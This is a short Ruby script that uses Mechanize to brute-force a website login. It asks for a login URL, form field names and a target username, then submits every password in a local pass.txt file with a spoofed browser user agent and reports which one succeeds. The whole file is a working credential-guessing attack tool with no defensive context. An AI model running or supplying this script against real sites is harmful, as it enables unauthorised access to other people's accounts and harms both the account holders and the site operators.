require "mechanize"


print "Enter the login page link: "
login_page_link = gets.chomp
print "Enter the form action name: "
form_action_name = gets.chomp
print "Enter a username to crack: "
user = gets.chomp
print "Enter username field name: "
user_field = gets.chomp
print "Enter password field name: "
pass_field = gets.chomp



USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
passwds_file = File.open("pass.txt", "r")

for line in passwds_file do 
	passwd = line.strip
	mechanize_agent = Mechanize.new do |agent|
		agent.user_agent = USER_AGENT
	end
	form_page = mechanize_agent.get(login_page_link)
	base_url = form_page.uri.to_s
	form = form_page.form_with(:action =>form_action_name)
	form.field_with(:name => user_field).value=user
	form.field_with(:name => pass_field).value=passwd
	page = form.click_button
	login_page_url = page.uri.to_s
	if login_page_url == base_url or login_page_url.include? "#{base_url.gsub("http://", "")}" then 
		puts "[-] login failed with password: #{passwd}"
	else
		puts "[+] login successfully with password: #{passwd} and user: #{user}"
		break
	end
end



